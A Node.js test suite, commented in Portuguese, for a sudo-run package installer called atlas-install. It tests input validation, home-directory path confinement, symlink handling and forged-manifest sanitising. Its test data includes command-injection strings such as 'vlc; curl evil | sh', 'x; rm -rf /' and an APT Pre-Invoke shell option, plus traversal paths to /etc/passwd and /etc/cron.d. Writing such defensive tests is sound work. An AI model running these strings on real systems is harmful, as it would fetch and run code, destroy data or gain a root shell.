// Validação do atlas-install: nada de apt, dpkg nem root aqui. Só as funções puras e o sistema de
// arquivos em diretório temporário (o dono "confiável" é o usuário que roda o teste).
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, test } from "node:test";
import { fileURLToPath } from "node:url";
import {
	atlasPaths,
	ensureTrustedAtlasDir,
	ensureTrustedSubdir,
	EXIT,
	InstallError,
	MAX_MANIFEST_ENTRIES,
	MAX_PACKAGES,
	needsAptUpdate,
	openDebFromHome,
	openTrustedDir,
	packageNameError,
	parseCommand,
	parseDebFields,
	parseInstalled,
	planReinstall,
	readManifest,
	sanitizeManifest,
	storedDebName,
	verifyStoredDeb,
	writeManifest,
} from "./atlas-install-lib.mjs";
import { main } from "./atlas-install.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI = join(HERE, "atlas-install.mjs");
const uid = process.getuid();
let root;
let home;

beforeEach(() => {
	root = mkdtempSync(join(tmpdir(), "atlas-install-"));
	home = join(root, "home", "atlas");
	mkdirSync(join(home, "work"), { recursive: true });
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

const sha = (text) => createHash("sha256").update(text).digest("hex");
const rejects = (fn, pattern, code) =>
	assert.throws(fn, (error) => {
		assert.ok(error instanceof InstallError, `esperava InstallError, veio ${error}`);
		if (pattern) assert.match(error.message, pattern);
		if (code !== undefined) assert.equal(error.code, code);
		return true;
	});

describe("nome de pacote", () => {
	for (const name of ["vlc", "g++", "libstdc++6", "python3.11", "a", "libreoffice-writer", "0ad", "x".repeat(63)]) {
		test(`aceita ${name}`, () => assert.equal(packageNameError(name), null));
	}
	const bad = ["", "-o", "--help", "-y", "foo;bar", "foo bar", "foo\tbar", "foo\nbar", "Foo", "foo=1.0", "foo/stable", "foo:amd64", "$(id)", "`id`", "a|b", "a&b", "../x", ".hidden", "+x", "foo-", "x".repeat(64), "vlc'", 'vlc"', "vlc*", "vlc?", "vlc\u0000"];
	for (const name of bad) {
		test(`recusa ${JSON.stringify(name)}`, () => assert.notEqual(packageNameError(name), null));
	}
	test("recusa o que não é texto", () => {
		for (const value of [undefined, null, 1, {}, ["vlc"]]) assert.notEqual(packageNameError(value), null);
	});
});

describe("parseCommand", () => {
	test("apt: lista de pacotes sem repetição", () => {
		assert.deepEqual(parseCommand(["apt", "vlc", "vlc", "git"]), { action: "apt", dryRun: false, packages: ["vlc", "git"] });
	});
	test("apt: sem pacote, com opção ou com nome inválido falha ANTES de rodar qualquer coisa", () => {
		rejects(() => parseCommand(["apt"]), /which packages/, EXIT.USAGE);
		rejects(() => parseCommand(["apt", "-o", "APT::Update::Pre-Invoke=/bin/sh"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "vlc", "-o", "x"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "vlc;reboot"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "vlc git"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "--reinstall", "vlc"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "vlc=1.0"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["apt", "vlc-"]), /must not end with/, EXIT.BAD_INPUT);
	});
	test(`apt: no máximo ${MAX_PACKAGES} pacotes por chamada`, () => {
		const ok = Array.from({ length: MAX_PACKAGES }, (_, i) => `pkg${i}`);
		assert.equal(parseCommand(["apt", ...ok]).packages.length, MAX_PACKAGES);
		rejects(() => parseCommand(["apt", ...ok, "extra"]), /at most/, EXIT.BAD_INPUT);
	});
	test("deb, remove, list, prepare, reinstall", () => {
		assert.deepEqual(parseCommand(["deb", "a.deb"]), { action: "deb", dryRun: false, file: "a.deb" });
		rejects(() => parseCommand(["deb"]), /exactly one/, EXIT.USAGE);
		rejects(() => parseCommand(["deb", "a.deb", "b.deb"]), /exactly one/, EXIT.USAGE);
		assert.deepEqual(parseCommand(["remove", "vlc"]), { action: "remove", dryRun: false, package: "vlc" });
		rejects(() => parseCommand(["remove", "-y"]), /invalid package name/, EXIT.BAD_INPUT);
		rejects(() => parseCommand(["remove", "a", "b"]), /exactly one/, EXIT.USAGE);
		assert.equal(parseCommand(["list"]).action, "list");
		rejects(() => parseCommand(["list", "x"]), /no arguments/, EXIT.USAGE);
		assert.equal(parseCommand(["--dry-run", "apt", "vlc"]).dryRun, true);
	});
	test("comando desconhecido ou ausente mostra o uso", () => {
		rejects(() => parseCommand([]), /missing command/, EXIT.USAGE);
		rejects(() => parseCommand(["purge", "vlc"]), /unknown command/, EXIT.USAGE);
		rejects(() => parseCommand(["install", "vlc"]), /usage: sudo atlas-install/, EXIT.USAGE);
	});
});

describe("openDebFromHome", () => {
	const deb = (name = "ok.deb", body = "!<arch>\n") => {
		const file = join(home, "work", name);
		writeFileSync(file, body);
		return file;
	};
	const open = (input) => openDebFromHome(input, { home, cwd: join(home, "work") });

	test("aceita um .deb dentro do home (absoluto ou relativo ao cwd)", async () => {
		const file = deb();
		const a = open(file);
		assert.equal(a.real, file);
		(await import("node:fs")).closeSync(a.fd);
		const b = open("ok.deb");
		assert.equal(b.real, file);
		(await import("node:fs")).closeSync(b.fd);
	});
	test("recusa arquivo fora do home", () => {
		const outside = join(root, "outside.deb");
		writeFileSync(outside, "x");
		rejects(() => open(outside), /must be inside/, EXIT.BAD_INPUT);
	});
	test("recusa link simbólico que aponta para fora do home", () => {
		const outside = join(root, "evil.deb");
		writeFileSync(outside, "x");
		symlinkSync(outside, join(home, "work", "link.deb"));
		rejects(() => open(join(home, "work", "link.deb")), /must be inside/, EXIT.BAD_INPUT);
	});
	test("recusa diretório que é link para fora (arquivo dentro dele)", () => {
		const outsideDir = join(root, "outdir");
		mkdirSync(outsideDir);
		writeFileSync(join(outsideDir, "x.deb"), "x");
		symlinkSync(outsideDir, join(home, "work", "dirlink"));
		rejects(() => open(join(home, "work", "dirlink", "x.deb")), /must be inside/, EXIT.BAD_INPUT);
	});
	test("recusa '..' no caminho mesmo quando ele volta para dentro do home", () => {
		deb();
		rejects(() => open(`${home}/work/../work/ok.deb`), /"\.\."/, EXIT.BAD_INPUT);
		rejects(() => open("../../../etc/passwd"), /"\.\."/, EXIT.BAD_INPUT);
	});
	test("recusa o que não é .deb, diretório, arquivo vazio e caminho vazio ou com NUL", () => {
		writeFileSync(join(home, "work", "a.sh"), "#!/bin/sh");
		rejects(() => open(join(home, "work", "a.sh")), /end in \.deb/, EXIT.BAD_INPUT);
		mkdirSync(join(home, "work", "dir.deb"));
		rejects(() => open(join(home, "work", "dir.deb")), /regular file/, EXIT.BAD_INPUT);
		deb("empty.deb", "");
		rejects(() => open(join(home, "work", "empty.deb")), /empty/, EXIT.BAD_INPUT);
		rejects(() => open(""), /invalid file path/, EXIT.BAD_INPUT);
		rejects(() => open("a\0.deb"), /invalid file path/, EXIT.BAD_INPUT);
		rejects(() => open(join(home, "work", "nao-existe.deb")), /not found/, EXIT.NO_INPUT);
	});
	test("recusa o próprio home e arquivo acima do limite de tamanho", () => {
		rejects(() => open(home), /must be inside/, EXIT.BAD_INPUT);
		deb("big.deb", "0123456789");
		rejects(() => openDebFromHome(join(home, "work", "big.deb"), { home, maxBytes: 4 }), /too large/, EXIT.BAD_INPUT);
	});
});

describe("diretório confiável (.atlas)", () => {
	test("cria .atlas e debs com a regra de confiança", () => {
		const { trusted, quarantined } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		assert.equal(quarantined, null);
		const debs = ensureTrustedSubdir(trusted, "debs", { trustedUid: uid });
		assert.ok(existsSync(atlasPaths(home).debs));
		debs.close();
		trusted.close();
	});
	test(".atlas pré-criado como link simbólico é movido de lado, nunca seguido", () => {
		const target = join(root, "alvo");
		mkdirSync(target);
		symlinkSync(target, atlasPaths(home).dir);
		const { trusted, quarantined } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		assert.ok(quarantined?.includes(".atlas.untrusted-"));
		writeManifest(trusted, { version: 1, apt: [], debs: [] });
		assert.equal(existsSync(join(target, "installed.json")), false, "escreveu através do link");
		assert.ok(existsSync(join(atlasPaths(home).dir, "installed.json")));
		trusted.close();
	});
	test(".atlas com escrita para o grupo ou de outro dono é movido de lado", () => {
		mkdirSync(atlasPaths(home).dir, { mode: 0o755 });
		chmodSync(atlasPaths(home).dir, 0o775);
		const { quarantined, trusted } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		assert.ok(quarantined);
		trusted.close();
		rejectsOwner();
	});
	function rejectsOwner() {
		// Dono diferente do confiável: openTrustedDir recusa.
		mkdirSync(join(root, "d"), { mode: 0o755 });
		assert.equal(openTrustedDir(join(root, "d"), { trustedUid: uid + 1 }).ok, false);
		assert.equal(openTrustedDir(join(root, "nao-existe"), { trustedUid: uid }).ok, false);
	}
});

describe("manifesto", () => {
	const good = () => ({
		version: 1,
		apt: [{ name: "vlc", installedAt: "2026-11-02T10:00:00.000Z" }],
		debs: [{ name: "foo", file: storedDebName("foo", sha("x")), sha256: sha("x"), installedAt: "2026-11-02T10:00:00.000Z" }],
	});

	test("entrada válida passa intacta", () => {
		const { manifest, dropped } = sanitizeManifest(good());
		assert.deepEqual(dropped, []);
		assert.equal(manifest.apt[0].name, "vlc");
		assert.equal(manifest.debs[0].name, "foo");
	});
	test("adulterado: nomes com ; espaço, -o, ../ e $() são descartados", () => {
		const forged = good();
		forged.apt.push(
			{ name: "vlc; curl evil | sh" },
			{ name: "-o" },
			{ name: "../../etc/passwd" },
			{ name: "$(id)" },
			{ name: "Vlc" },
			{ name: 1 },
			null,
			"vlc",
			{ name: "git" },
		);
		const { manifest, dropped } = sanitizeManifest(forged);
		assert.deepEqual(manifest.apt.map((e) => e.name), ["vlc", "git"]);
		assert.ok(dropped.length >= 7);
	});
	test("adulterado: .deb com caminho, nome ou hash forjado é descartado", () => {
		const forged = good();
		forged.debs.push(
			{ name: "foo2", file: "../../../tmp/x.deb", sha256: sha("y") },
			{ name: "foo3", file: "/tmp/x.deb", sha256: sha("y") },
			{ name: "foo4", file: storedDebName("foo4", sha("z")), sha256: "nao-e-hash" },
			{ name: "foo5", file: storedDebName("other", sha("w")), sha256: sha("w") },
			{ name: "bad name", file: storedDebName("foo6", sha("v")), sha256: sha("v") },
		);
		const { manifest } = sanitizeManifest(forged);
		assert.deepEqual(manifest.debs.map((e) => e.name), ["foo"]);
	});
	test("formas inesperadas viram manifesto vazio, sem lançar", () => {
		for (const raw of [null, 1, "x", [], { apt: "vlc", debs: 3 }]) {
			const { manifest } = sanitizeManifest(raw);
			assert.deepEqual(manifest.apt, []);
			assert.deepEqual(manifest.debs, []);
		}
	});
	test(`limite de ${MAX_MANIFEST_ENTRIES} entradas`, () => {
		const raw = { apt: Array.from({ length: MAX_MANIFEST_ENTRIES + 50 }, (_, i) => ({ name: `pkg${i}` })), debs: [] };
		const { manifest, dropped } = sanitizeManifest(raw);
		assert.equal(manifest.apt.length, MAX_MANIFEST_ENTRIES);
		assert.ok(dropped.length >= 50);
	});
	test("leitura do disco: JSON quebrado, grande demais ou link simbólico viram vazio", () => {
		const { trusted } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		const file = join(atlasPaths(home).dir, "installed.json");
		writeFileSync(file, "{not json");
		assert.deepEqual(readManifest(trusted, { trustedUid: uid }).manifest.apt, []);
		rmSync(file);
		const target = join(root, "forjado.json");
		writeFileSync(target, JSON.stringify(good()));
		symlinkSync(target, file);
		assert.deepEqual(readManifest(trusted, { trustedUid: uid }).manifest.apt, [], "seguiu o link");
		trusted.close();
	});
	test("gravar e ler de volta", () => {
		const { trusted } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		writeManifest(trusted, good());
		assert.equal(readManifest(trusted, { trustedUid: uid }).manifest.apt[0].name, "vlc");
		assert.equal(JSON.parse(readFileSync(atlasPaths(home).manifest, "utf8")).version, 1);
		trusted.close();
	});
});

describe("reinstalação com manifesto adulterado", () => {
	test("só o que passa na validação entra no plano; .deb forjado não existe em debs/ e é recusado", () => {
		const { trusted } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		const debs = ensureTrustedSubdir(trusted, "debs", { trustedUid: uid });
		const realBody = "conteudo-do-deb";
		const realName = storedDebName("real", sha(realBody));
		writeFileSync(join(atlasPaths(home).debs, realName), realBody);
		const forgedBody = storedDebName("fake", sha("outro"));
		writeFileSync(
			atlasPaths(home).manifest,
			JSON.stringify({
				version: 1,
				apt: [{ name: "vlc" }, { name: "x; rm -rf /" }, { name: "-o" }, { name: "git" }],
				debs: [
					{ name: "real", file: realName, sha256: sha(realBody) },
					{ name: "fake", file: forgedBody, sha256: sha("outro") },
					{ name: "evil", file: "../../../etc/cron.d/x", sha256: sha("e") },
				],
			}),
		);
		const { manifest } = readManifest(trusted, { trustedUid: uid });
		const plan = planReinstall(manifest, new Set(["git"]));
		assert.deepEqual(plan.apt, ["vlc"]);
		assert.deepEqual(plan.debs.map((e) => e.name), ["real", "fake"]);
		assert.equal(verifyStoredDeb(debs, plan.debs[0], { trustedUid: uid }), null);
		assert.equal(verifyStoredDeb(debs, plan.debs[1], { trustedUid: uid }), "file missing");
		debs.close();
		trusted.close();
	});
	test("verifyStoredDeb: hash diferente, link simbólico e nome fora do padrão", () => {
		const { trusted } = ensureTrustedAtlasDir(home, { trustedUid: uid });
		const debs = ensureTrustedSubdir(trusted, "debs", { trustedUid: uid });
		const name = storedDebName("pkg", sha("a"));
		const entry = { name: "pkg", file: name, sha256: sha("a") };
		writeFileSync(join(atlasPaths(home).debs, name), "trocado");
		assert.equal(verifyStoredDeb(debs, entry, { trustedUid: uid }), "checksum mismatch");
		rmSync(join(atlasPaths(home).debs, name));
		const target = join(root, "alvo.deb");
		writeFileSync(target, "a");
		symlinkSync(target, join(atlasPaths(home).debs, name));
		assert.equal(verifyStoredDeb(debs, entry, { trustedUid: uid }), "file is not trustworthy");
		assert.equal(verifyStoredDeb(debs, { ...entry, file: "../x.deb" }, { trustedUid: uid }), "bad file name");
		debs.close();
		trusted.close();
	});
});

describe("funções auxiliares", () => {
	test("parseInstalled lê só os 'ii'", () => {
		const out = "vlc ii \ngit ii \nold rc \nbroken iU\nlibc6 ii \n";
		assert.deepEqual([...parseInstalled(out)].sort(), ["git", "libc6", "vlc"]);
	});
	test("needsAptUpdate: sem índice, sem carimbo ou velho", () => {
		const now = Date.now();
		assert.equal(needsAptUpdate({ listsCount: 0, stampMtimeMs: now, now }), true);
		assert.equal(needsAptUpdate({ listsCount: 3, stampMtimeMs: undefined, now }), true);
		assert.equal(needsAptUpdate({ listsCount: 3, stampMtimeMs: now - 7 * 3600_000, now }), true);
		assert.equal(needsAptUpdate({ listsCount: 3, stampMtimeMs: now - 3600_000, now }), false);
	});
	test("parseDebFields", () => {
		assert.deepEqual(parseDebFields("Package: foo\nArchitecture: amd64\n"), { Package: "foo", Architecture: "amd64" });
		assert.deepEqual(parseDebFields("Package: foo bar\n"), {});
	});
});

describe("CLI", () => {
	const cli = (args, env = {}) => spawnSync(process.execPath, [CLI, ...args], { encoding: "utf8", env: { PATH: process.env.PATH, ...env } });

	test("dry-run valida e mostra o plano sem tocar em nada", () => {
		const ok = cli(["--dry-run", "apt", "vlc", "g++"]);
		assert.equal(ok.status, 0);
		assert.match(ok.stdout, /would install apt packages: vlc g\+\+/);
	});
	test("dry-run recusa nome inválido com código 65 e mensagem clara", () => {
		for (const args of [["apt", "-o"], ["apt", "vlc;id"], ["apt", "a b"]]) {
			const result = cli(["--dry-run", ...args]);
			assert.equal(result.status, EXIT.BAD_INPUT, args.join(" "));
			assert.match(result.stderr, /invalid package name/);
		}
		assert.equal(cli(["--dry-run", "wat"]).status, EXIT.USAGE);
	});
	test("dry-run de .deb: dentro do home passa, link para fora e '..' falham", () => {
		const good = join(home, "work", "a.deb");
		writeFileSync(good, "x");
		const env = { ATLAS_INSTALL_HOME: home };
		assert.equal(cli(["--dry-run", "deb", good], env).status, 0);
		const outside = join(root, "o.deb");
		writeFileSync(outside, "x");
		symlinkSync(outside, join(home, "work", "l.deb"));
		const viaLink = cli(["--dry-run", "deb", join(home, "work", "l.deb")], env);
		assert.equal(viaLink.status, EXIT.BAD_INPUT);
		assert.match(viaLink.stderr, /must be inside/);
		const dots = cli(["--dry-run", "deb", `${home}/work/../../../etc/passwd`], env);
		assert.equal(dots.status, EXIT.BAD_INPUT);
		assert.match(dots.stderr, /"\.\."/);
	});
	test("sem --dry-run e sem root: recusa antes de tocar em arquivo (77)", () => {
		assert.equal(main(["apt", "vlc"], { uid: 1001, env: {} }), EXIT.NO_PERMISSION);
		assert.equal(main(["list"], { uid: 1001, env: {} }), EXIT.NO_PERMISSION);
	});
	test("prepare e reinstall são internos: recusados quando vêm do sudo", () => {
		assert.equal(main(["prepare"], { uid: 0, env: { SUDO_USER: "atlas" } }), EXIT.NO_PERMISSION);
		assert.equal(main(["reinstall"], { uid: 0, env: { SUDO_USER: "atlas" } }), EXIT.NO_PERMISSION);
	});
	test("a validação roda antes da checagem de root (nome inválido nunca chega ao apt)", () => {
		assert.equal(main(["apt", "-o", "x"], { uid: 0, env: {} }), EXIT.BAD_INPUT);
	});
});
